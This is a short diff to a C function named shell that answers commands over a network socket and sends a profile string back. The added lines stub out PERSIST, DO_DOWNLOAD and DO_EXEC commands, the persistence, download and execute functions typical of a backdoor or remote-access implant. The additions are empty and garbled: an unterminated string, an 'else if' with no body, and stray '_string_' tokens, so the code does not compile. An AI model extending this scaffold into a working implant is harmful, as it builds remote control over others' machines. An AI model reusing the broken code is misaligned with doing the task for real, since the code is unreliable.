@@ -150,6 +150,15 @@ void shell(int port)
     //write(confd, strProfile(), 2048);
     send(confd, strProfile(), 2048, 0);
   }
+  
+  else if (strcmp(arg0, "PERSIST\n") == 0)
+  else if (strcmp(arg0, "DO_DOWNLOAD") == 0){
+  
+  } _string_
+  
+ else if (strcmp(arg0, "DO_EXEC) == 0){
+ 
+ } _string_
   else{
     printf("Incorrect Command.\n");
     continue;
